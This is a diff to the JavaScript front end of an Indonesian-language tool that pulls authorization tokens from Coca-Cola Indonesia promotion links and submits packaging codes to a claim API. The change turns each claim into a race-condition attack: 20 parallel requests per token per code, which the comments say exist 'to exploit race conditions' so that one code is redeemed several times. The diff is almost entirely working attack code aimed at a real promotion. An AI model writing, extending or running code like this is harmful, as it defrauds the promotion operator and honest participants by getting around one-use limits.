@@ -71,17 +71,20 @@ function showToast(message, type = 'info') {
 }
 
 // Function to extract token from Coca-Cola link
-async function extractToken(cocaColaLink) {
+async function extractToken(cocaColaLink, isSecondLink = false) {
   try {
     const tokenStatus = document.getElementById('token-status');
     const extractionAttempt = document.getElementById('extraction-attempt');
     tokenStatus.classList.remove('hidden');
     
+    const linkNumber = isSecondLink ? "kedua" : "pertama";
+    extractionAttempt.textContent = `Mengekstrak token dari link ${linkNumber}...`;
+    
     // Start a counter to show how long we've been trying
     let seconds = 0;
     const extractionTimer = setInterval(() => {
       seconds++;
-      extractionAttempt.textContent = `Percobaan sedang berlangsung selama ${seconds} detik...`;
+      extractionAttempt.textContent = `Mengekstrak token dari link ${linkNumber}: ${seconds} detik...`;
     }, 1000);
     
     const response = await fetch('/api/extract-token', {
@@ -97,19 +100,25 @@ async function extractToken(cocaColaLink) {
     
     if (!response.ok) {
       const errorData = await response.json();
-      throw new Error(errorData.message || `Gagal mengambil kode: ${response.status}`);
+      throw new Error(errorData.message || `Gagal mengambil kode dari link ${linkNumber}: ${response.status}`);
     }
     
     const data = await response.json();
-    tokenStatus.classList.add('hidden');
+    
+    // Only hide the token status if this is the second link or there's no second link
+    if (isSecondLink) {
+      tokenStatus.classList.add('hidden');
+    }
     
     if (!data.success) {
-      throw new Error(data.message || 'Gagal mengambil kode akses dari link');
+      throw new Error(data.message || `Gagal mengambil kode akses dari link ${linkNumber}`);
     }
     
     return data.token;
   } catch (error) {
-    document.getElementById('token-status').classList.add('hidden');
+    if (isSecondLink) {
+      document.getElementById('token-status').classList.add('hidden');
+    }
     throw error;
   }
 }
@@ -158,8 +167,8 @@ function getSuccessMessage(responseData) {
   }
 }
 
-// Function to claim a single code via API
-async function claimCode(packagingCode, authorization, codeIndex = 0, totalCodes = 1) {
+// New function to claim a code with parallel requests to exploit race conditions
+async function claimCodeParallel(packagingCode, authorizations, codeIndex = 0, totalCodes = 1) {
   try {
     // Get DOM elements for updating UI
     const resultDisplay = document.getElementById('result-display');
@@ -188,70 +197,136 @@ async function claimCode(packagingCode, authorization, codeIndex = 0, totalCodes
     const realtimeStatusDiv = document.createElement('div');
     realtimeStatusDiv.id = `realtime-status-${codeIndex}`;
     realtimeStatusDiv.className = 'p-2 mb-2 bg-blue-100 text-blue-800 rounded';
-    realtimeStatusDiv.innerHTML = `<span class="font-medium">Kode ${codeIndex + 1}: ${packagingCode} - Sedang memproses...</span>`;
+    realtimeStatusDiv.innerHTML = `<span class="font-medium">Kode ${codeIndex + 1}: ${packagingCode} - Mempersiapkan race condition...</span>`;
     resultDisplay.prepend(realtimeStatusDiv);
     
-    // Set up event source for real-time updates
-    const eventSource = new EventSource('/api/attempt-events');
+    // Set up event source for real-time updates - disabled for parallel processing
+    // We'll use our own counter for parallel requests
+    let attemptNum = 0;
+    const maxParallelRequests = 20; // Number of parallel requests per link
     
-    // Update the UI with each attempt
-    eventSource.onmessage = function(event) {
-      try {
-        const data = JSON.parse(event.data);
-        if (data.attempt) {
-          const attemptNum = data.attempt;
-          
-          // Update the realtime status display
-          realtimeStatusDiv.innerHTML = `<span class="font-medium">Kode ${codeIndex + 1}: ${packagingCode} - Percobaan ke-${attemptNum}/25</span>`;
-          
-          // Update the progress counter
-          attemptCounter.textContent = `Kode ${codeIndex + 1}/${totalCodes}: ${packagingCode} - Percobaan ke-${attemptNum}/25`;
-          
-          // Calculate progress based on max 25 attempts
-          const attemptProgress = Math.min(10 + (attemptNum / 25) * 70, 85);
-          progressBar.style.width = `${attemptProgress}%`;
-        }
-      } catch (e) {
-        console.error('Error parsing SSE data:', e);
+    // Results array to store responses for each token
+    const results = [];
+    const successResults = [];
+    let processingComplete = false;
+    
+    // Update UI to show we're starting parallel processing
+    realtimeStatusDiv.innerHTML = `<span class="font-medium">Kode ${codeIndex + 1}: ${packagingCode} - Mengirim ${maxParallelRequests} request paralel per link...</span>`;
+    attemptCounter.textContent = `Mengirim ${authorizations.length * maxParallelRequests} request paralel untuk kode: ${packagingCode}`;
+    
+    // Arrays to track promises and their outcomes
+    const allPromises = [];
+    
+    // Process each authorization token in parallel with multiple requests
+    for (let i = 0; i < authorizations.length; i++) {
+      const authorization = authorizations[i];
+      const linkNumber = i + 1;
+      
+      // Status tracking for this link
+      const linkStatusDiv = document.createElement('div');
+      linkStatusDiv.className = 'mt-2 text-xs';
+      linkStatusDiv.innerHTML = `<span class="font-medium">Link #${linkNumber}:</span> Mengirim ${maxParallelRequests} request paralel...`;
+      realtimeStatusDiv.appendChild(linkStatusDiv);
+      
+      // Create an array of promises for parallel requests for this link
+      const linkPromises = [];
+      
+      // Launch multiple parallel requests for the same code
+      for (let j = 0; j < maxParallelRequests; j++) {
+        const requestPromise = (async () => {
+          try {
+            // Make API call to our Express backend
+            const response = await fetch('/api/claim', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                packagingCode,
+                authorization
+              })
+            });
+            
+            if (response.ok) {
+              const result = await response.json();
+              
+              // If this attempt was successful, add it to success results
+              if (result.success) {
+                successResults.push({ linkNumber, requestNumber: j + 1, result });
+                
+                // Update the link status div to show success
+                linkStatusDiv.innerHTML = `<span class="font-medium text-green-600">Link #${linkNumber}:</span> Berhasil pada request ke-${j + 1}!`;
+                
+                // Get the success message
+                const successMessage = getSuccessMessage(result.result);
+                
+                // Create a success notification
+                const successNotif = document.createElement('div');
+                successNotif.className = 'mt-1 text-xs bg-green-50 text-green-700 p-1 rounded';
+                successNotif.innerHTML = `Request #${j + 1}: ${successMessage}`;
+                linkStatusDiv.appendChild(successNotif);
+              }
+              
+              return { linkNumber, requestNumber: j + 1, result, success: result.success };
+            } else {
+              return { 
+                linkNumber, 
+                requestNumber: j + 1,
+                success: false, 
+                error: `Error ${response.status}: ${response.statusText}` 
+              };
+            }
+          } catch (error) {
+            return { 
+              linkNumber, 
+              requestNumber: j + 1,
+              success: false, 
+              error: error.message 
+            };
+          }
+        })();
+        
+        linkPromises.push(requestPromise);
+        allPromises.push(requestPromise);
       }
-    };
-    
-    eventSource.onerror = function() {
-      console.log('SSE connection closed or errored');
-      eventSource.close();
-    };
-    
-    // Make API call to our Express backend
-    const response = await fetch('/api/claim', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        packagingCode,
-        authorization
-      })
-    });
-    
-    // Close the event source
-    eventSource.close();
-    
-    if (!response.ok) {
-      throw new Error(`Server merespon dengan status: ${response.status}`);
+      
+      // When all requests for this link are done, update the UI
+      Promise.all(linkPromises).then(linkResults => {
+        const successCount = linkResults.filter(r => r.success).length;
+        linkStatusDiv.innerHTML = `<span class="font-medium">Link #${linkNumber}:</span> ${successCount} dari ${maxParallelRequests} berhasil`;
+        
+        // For each successful request, show a success badge
+        const successItems = linkResults.filter(r => r.success);
+        if (successItems.length > 0) {
+          const successListDiv = document.createElement('div');
+          successListDiv.className = 'mt-1 flex flex-wrap gap-1';
+          successItems.forEach(item => {
+            const badge = document.createElement('span');
+            badge.className = 'inline-block bg-green-100 text-green-800 text-xs px-1 rounded';
+            badge.textContent = `#${item.requestNumber}`;
+            successListDiv.appendChild(badge);
+          });
+          linkStatusDiv.appendChild(successListDiv);
+        }
+      });
     }
     
-    const result = await response.json();
+    // Wait for all requests to complete
+    const allResults = await Promise.all(allPromises);
+    
+    // Update UI when all parallel requests are done
+    realtimeStatusDiv.innerHTML = `<span class="font-medium">Kode ${codeIndex + 1}: ${packagingCode} - Proses paralel selesai</span>`;
+    
+    // Check if we had at least one success
+    const hasSuccess = successResults.length > 0;
     
     // Remove the realtime status div
     if (document.getElementById(`realtime-status-${codeIndex}`)) {
       document.getElementById(`realtime-status-${codeIndex}`).remove();
     }
     
-    // Remove pulsing animation from progress bar
-    progressBar.classList.remove('animate-pulse');
-    
     // Update progress bar based on result
-    const progressPercent = result.success ? 
+    const progressPercent = hasSuccess ? 
       ((codeIndex + 1) / totalCodes) * 100 : 
       ((codeIndex) / totalCodes) * 100 + (1 / totalCodes) * 30;
     progressBar.style.width = `${progressPercent}%`;
@@ -263,7 +338,7 @@ async function claimCode(packagingCode, authorization, codeIndex = 0, totalCodes
     if (codeElements[codeIndex]) {
       const badgeElement = codeElements[codeIndex].nextElementSibling;
       
-      if (result.success) {
+      if (hasSuccess) {
         badgeElement.textContent = "Berhasil";
         badgeElement.className = "ml-2 code-badge badge-success";
       } else {
@@ -272,79 +347,53 @@ async function claimCode(packagingCode, authorization, codeIndex = 0, totalCodes
       }
     }
     
-    if (result.success) {
-      // Success case - Get custom message based on response data
-      const successMessage = getSuccessMessage(result.result);
+    if (hasSuccess) {
+      // At least one success - show the combined result
+      const successCount = successResults.length;
+      const linkSuccessCounts = {};
+      
+      // Count successes per link
+      successResults.forEach(r => {
+        if (!linkSuccessCounts[r.linkNumber]) {
+          linkSuccessCounts[r.linkNumber] = 0;
+        }
+        linkSuccessCounts[r.linkNumber]++;
+      });
+      
+      // Generate summary message
+      const linkSummaries = Object.keys(linkSuccessCounts).map(linkNum => {
+        return `Link #${linkNum}: ${linkSuccessCounts[linkNum]} sukses`;
+      }).join(', ');
+      
+      // Generate detailed success messages
+      const allMessages = successResults.map((r, idx) => {
+        const msg = getSuccessMessage(r.result.result);
+        return `<div class="mt-1">✅ #${idx+1} - Link #${r.linkNumber}, Request #${r.requestNumber}: ${msg}</div>`;
+      }).join('');
       
       logEntry.className = 'p-2 mb-2 bg-green-100 text-green-800 rounded';
-      logEntry.innerHTML = `<strong>Kode ${codeIndex + 1}: ${packagingCode} - ${successMessage}</strong><br><span class="text-xs">(Berhasil pada percobaan ke-${result.attempts})</span><br><details class="mt-1"><summary class="cursor-pointer text-xs">Lihat Detail</summary><pre class="mt-1 text-xs overflow-auto">${JSON.stringify(result.result, null, 2)}</pre></details>`;
+      logEntry.innerHTML = `<strong>Kode ${codeIndex + 1}: ${packagingCode} - ${successCount} klaim berhasil! (${linkSummaries})</strong>${allMessages}`;
       
       if (codeIndex === totalCodes - 1 || totalCodes === 1) {
         // Only show toast for single code or the last code in batch
-        showToast(`${successMessage} (Percobaan ke-${result.attempts})`, 'success');
+        showToast(`${successCount} klaim berhasil dengan race condition! (${linkSummaries})`, 'success');
       }
     } else {
-      // Error case
-      switch (result.status) {
-        case 'LIMIT_REACHED':
-          logEntry.className = 'p-2 mb-2 bg-red-100 text-red-800 rounded';
-          logEntry.innerHTML = `<strong>Kode ${codeIndex + 1}: ${packagingCode} - ⚠️ ${result.message}</strong>`;
-          if (codeIndex === totalCodes - 1 || totalCodes === 1) {
-            showToast(result.message, 'error');
-          }
-          break;
-        case 'INVALID_CODE':
-          logEntry.className = 'p-2 mb-2 bg-red-100 text-red-800 rounded';
-          logEntry.innerHTML = `<strong>Kode ${codeIndex + 1}: ${packagingCode} - ❌ ${result.message}</strong>`;
-          if (codeIndex === totalCodes - 1 || totalCodes === 1) {
-            showToast(result.message, 'error');
-          }
-          break;
-        case 'INVALID_ARGUMENT':
-          // Check for the specific error message "packaging_code_used"
-          if (result.result && result.result.error && result.result.error.message === 'packaging_code_used') {
-            logEntry.className = 'p-2 mb-2 bg-orange-100 text-orange-800 rounded';
-            logEntry.innerHTML = `<strong>Kode ${codeIndex + 1}: ${packagingCode} - ⚠️ Kode sudah digunakan</strong>`;
-            if (codeIndex === totalCodes - 1 || totalCodes === 1) {
-              showToast('Kode sudah digunakan', 'error');
-            }
-          } else {
-            logEntry.className = 'p-2 mb-2 bg-red-100 text-red-800 rounded';
-            logEntry.innerHTML = `<strong>Kode ${codeIndex + 1}: ${packagingCode} - ❌ ${result.message}</strong>`;
-            if (codeIndex === totalCodes - 1 || totalCodes === 1) {
-              showToast(result.message, 'error');
-            }
-          }
-          break;
-        case 'MAX_ATTEMPTS':
-          logEntry.className = 'p-2 mb-2 bg-yellow-100 text-yellow-800 rounded';
-          logEntry.innerHTML = `<strong>Kode ${codeIndex + 1}: ${packagingCode} - ⚠️ ${result.message}</strong><br><span class="text-xs">(${result.attempts} percobaan)</span>`;
-          if (codeIndex === totalCodes - 1 || totalCodes === 1) {
-            showToast(result.message, 'error');
-          }
-          // Check if there's a "packaging_code_used" error in the final result after max attempts
-          if (result.result && result.result.error && result.result.error.message === 'packaging_code_used') {
-            logEntry.innerHTML = `<strong>Kode ${codeIndex + 1}: ${packagingCode} - ⚠️ Kode sudah digunakan</strong><br><span class="text-xs">(${result.attempts} percobaan)</span>`;
-            if (codeIndex === totalCodes - 1 || totalCodes === 1) {
-              showToast('Kode sudah digunakan', 'error');
-            }
-          }
-          break;
-        default:
-          logEntry.className = 'p-2 mb-2 bg-red-100 text-red-800 rounded';
-          logEntry.innerHTML = `<strong>Kode ${codeIndex + 1}: ${packagingCode} - Error:</strong><br><details class="mt-1"><summary class="cursor-pointer text-xs">Lihat Detail</summary><pre class="mt-1 text-xs overflow-auto">${JSON.stringify(result, null, 2)}</pre></details>`;
-          if (codeIndex === totalCodes - 1 || totalCodes === 1) {
-            showToast('Terjadi kesalahan saat memproses permintaan', 'error');
-          }
+      // All failed - show error message
+      logEntry.className = 'p-2 mb-2 bg-red-100 text-red-800 rounded';
+      logEntry.innerHTML = `<strong>Kode ${codeIndex + 1}: ${packagingCode} - Gagal dengan semua request paralel</strong>`;
+      
+      if (codeIndex === totalCodes - 1 || totalCodes === 1) {
+        showToast('Gagal dengan semua request paralel', 'error');
       }
     }
     
     // Add the result to the display
     resultDisplay.prepend(logEntry);
     
-    return result;
+    return { success: hasSuccess, results: allResults, successResults };
   } catch (error) {
-    console.error('Error claiming code:', error);
+    console.error('Error in parallel claim processing:', error);
     
     // Show error in the result display
     const resultDisplay = document.getElementById('result-display');
@@ -370,27 +419,27 @@ async function claimCode(packagingCode, authorization, codeIndex = 0, totalCodes
   }
 }
 
-// New function to process multiple codes sequentially
-async function processMultipleCodes(codes, token) {
+// Updated function to process multiple codes with race condition exploitation
+async function processMultipleCodes(codes, tokens) {
   const totalCodes = codes.length;
   const progressBar = document.getElementById('progress-bar');
   const attemptCounter = document.getElementById('attempt-counter');
   
   // Set initial progress
   progressBar.style.width = '0%';
-  attemptCounter.textContent = `Mempersiapkan ${totalCodes} kode...`;
+  attemptCounter.textContent = `Mempersiapkan ${totalCodes} kode dengan ${tokens.length} link untuk race condition...`;
   
-  // Process each code sequentially
+  // Process each code sequentially, but with parallel requests for each
   for (let i = 0; i < codes.length; i++) {
     const code = codes[i].trim();
     if (code) {
-      await claimCode(code, token, i, totalCodes);
+      await claimCodeParallel(code, tokens, i, totalCodes);
     }
   }
   
   // Final progress update
   progressBar.style.width = '100%';
-  attemptCounter.textContent = `Selesai memproses ${totalCodes} kode`;
+  attemptCounter.textContent = `Selesai memproses ${totalCodes} kode dengan race condition`;
   
   // Hide batch progress indicator
   document.getElementById('batch-progress').classList.add('hidden');
@@ -400,36 +449,20 @@ async function processMultipleCodes(codes, token) {
   document.getElementById('start-button').textContent = 'Mulai Claim';
 }
 
-// Function to update the attempt display
-function updateAttemptDisplay(attemptNumber) {
-  // Update the realtime attempt display
-  const realtimeDiv = document.getElementById('realtime-attempt');
-  if (realtimeDiv) {
-    realtimeDiv.innerHTML = `<strong>Mencoba: Percobaan ${attemptNumber}</strong>`;
-  }
-  
-  // Update the progress bar
-  const progressBar = document.getElementById('progress-bar');
-  const attemptCounter = document.getElementById('attempt-counter');
-  
-  // Calculate progress based on max 10 attempts
-  const progressPercent = Math.min(5 + ((attemptNumber / 10) * 85), 95);
-  progressBar.style.width = `${progressPercent}%`;
-  
-  // Update attempt counter text
-  attemptCounter.textContent = `Sedang berjalan: Percobaan ke-${attemptNumber}/10`;
-}
-
 // Variables to track link visibility state
 let isLinkVisible = false;
+let isLink2Visible = false;
 
 // Function to mask the sensitive part of Coca-Cola link
-function maskCokeLink(inputElement) {
+function maskCokeLink(inputElement, displayElementId = 'masked-link-display') {
   const value = inputElement.value;
-  const displayElement = document.getElementById('masked-link-display');
+  const displayElement = document.getElementById(displayElementId);
+  
+  // Check if this is the first or second link to determine visibility
+  const isVisible = displayElementId === 'masked-link-display' ? isLinkVisible : isLink2Visible;
   
   // If link is set to visible, don't mask anything
-  if (isLinkVisible) {
+  if (isVisible) {
     displayElement.style.display = 'none';
     inputElement.style.color = '';
     return;
@@ -466,15 +499,22 @@ function maskCokeLink(inputElement) {
 }
 
 // Function to toggle link visibility
-function toggleLinkVisibility() {
-  const linkInput = document.getElementById('coca-cola-link');
-  const showIcon = document.getElementById('show-link-icon');
-  const hideIcon = document.getElementById('hide-link-icon');
-  const maskedDisplay = document.getElementById('masked-link-display');
+function toggleLinkVisibility(inputId = 'coca-cola-link', displayId = 'masked-link-display', showIconId = 'show-link-icon', hideIconId = 'hide-link-icon') {
+  const linkInput = document.getElementById(inputId);
+  const showIcon = document.getElementById(showIconId);
+  const hideIcon = document.getElementById(hideIconId);
+  const maskedDisplay = document.getElementById(displayId);
   
-  isLinkVisible = !isLinkVisible;
+  // Toggle visibility state based on which link we're toggling
+  if (inputId === 'coca-cola-link') {
+    isLinkVisible = !isLinkVisible;
+  } else {
+    isLink2Visible = !isLink2Visible;
+  }
   
-  if (isLinkVisible) {
+  const isVisible = (inputId === 'coca-cola-link') ? isLinkVisible : isLink2Visible;
+  
+  if (isVisible) {
     // Show the actual link text
     linkInput.style.color = '';
     maskedDisplay.style.display = 'none';
@@ -484,7 +524,7 @@ function toggleLinkVisibility() {
     // Re-mask the link
     showIcon.classList.remove('hidden');
     hideIcon.classList.add('hidden');
-    maskCokeLink(linkInput);
+    maskCokeLink(linkInput, displayId);
   }
 }
 
@@ -492,6 +532,7 @@ function toggleLinkVisibility() {
 document.addEventListener('DOMContentLoaded', function() {
   const startButton = document.getElementById('start-button');
   const linkInput = document.getElementById('coca-cola-link');
+  const linkInput2 = document.getElementById('coca-cola-link-2');
   const addCodeButton = document.getElementById('add-code-button');
   
   // Always ensure right-clicking is enabled on mobile
@@ -556,6 +597,7 @@ document.addEventListener('DOMContentLoaded', function() {
   startButton.addEventListener('click', async function() {
     try {
       const cocaColaLink = document.getElementById('coca-cola-link').value;
+      const cocaColaLink2 = document.getElementById('coca-cola-link-2').value;
       const codeInputs = document.querySelectorAll('.packaging-code');
       
       // Collect all codes
@@ -568,38 +610,61 @@ document.addEventListener('DOMContentLoaded', function() {
       }
       
       if (!cocaColaLink || packagingCodes.length === 0) {
-        showToast('Silakan isi link Coca-Cola dan minimal 1 Kode Kemasan', 'error');
+        showToast('Silakan isi link Coca-Cola utama dan minimal 1 Kode Kemasan', 'error');
         return;
       }
 
-      // Validate that the link is a Coca-Cola link
+      // Validate that the first link is a valid Coca-Cola link
       if (!cocaColaLink.includes('ayo.coca-cola.co.id')) {
-        showToast('Silakan masukkan link Coca-Cola yang valid', 'error');
+        showToast('Silakan masukkan link Coca-Cola yang valid untuk link utama', 'error');
+        return;
+      }
+      
+      // Validate the second link if provided
+      if (cocaColaLink2 && !cocaColaLink2.includes('ayo.coca-cola.co.id')) {
+        showToast('Link Coca-Cola kedua tidak valid', 'error');
         return;
       }
       
       // Clear any previous results first when starting a new claim
-      document.getElementById('result-display').innerHTML = '<div class="text-gray-400 text-center">Memulai proses baru...</div>';
+      document.getElementById('result-display').innerHTML = '<div class="text-gray-400 text-center">Memulai proses race condition...</div>';
       
       // Update button state
       this.disabled = true;
-      this.textContent = 'Memproses...';
+      this.textContent = 'Memproses Race Condition...';
       
       // Reset progress
       document.getElementById('progress-bar').style.width = '0%';
       document.getElementById('attempt-counter').textContent = 'Mengekstrak token...';
       
-      // First extract the authorization token from the link
-      showToast('Mendapatkan token dari link...', 'info');
-      const token = await extractToken(cocaColaLink);
+      // Extract tokens from both links
+      const tokens = [];
       
-      if (!token) {
-        throw new Error('Gagal mendapatkan token dari link');
+      // Always extract token from the first link
+      showToast('Mendapatkan token dari link pertama...', 'info');
+      const token1 = await extractToken(cocaColaLink, false);
+      if (!token1) {
+        throw new Error('Gagal mendapatkan token dari link pertama');
+      }
+      tokens.push(token1);
+      
+      // Only extract from second link if provided
+      if (cocaColaLink2) {
+        showToast('Mendapatkan token dari link kedua...', 'info');
+        try {
+          const token2 = await extractToken(cocaColaLink2, true);
+          if (token2) {
+            tokens.push(token2);
+          }
+        } catch (error) {
+          console.error('Error extracting second token:', error);
+          showToast(`Error pada link kedua: ${error.message}. Hanya menggunakan link pertama.`, 'error');
+        }
       }
       
-      // Then start the claim process with the extracted token
-      showToast(`Token berhasil diekstrak, memulai proses claim ${packagingCodes.length} kode...`, 'success');
-      await processMultipleCodes(packagingCodes, token);
+      // Then start the claim process with the extracted tokens using race condition approach
+      showToast(`${tokens.length} token berhasil diekstrak, memulai race condition dengan ${packagingCodes.length} kode...`, 'success');
+      await processMultipleCodes(packagingCodes, tokens);
       
     } catch (error) {
       console.error('Process error:', error);
@@ -611,12 +676,15 @@ document.addEventListener('DOMContentLoaded', function() {
     }
   });
   
-  // Initialize the masking for the Coca-Cola link input
+  // Initialize the masking for the Coca-Cola link inputs
   if (linkInput.value) {
     maskCokeLink(linkInput);
   }
+  if (linkInput2.value) {
+    maskCokeLink(linkInput2, 'masked-link-display-2');
+  }
   
-  // Set up the visibility toggle
+  // Set up the visibility toggle for first link
   const toggleButton = document.getElementById('toggle-link-visibility');
-  toggleButton.addEventListener('click', toggleLinkVisibility);
+  toggleButton.addEventListener('click', () => toggleLinkVisibility());
 });
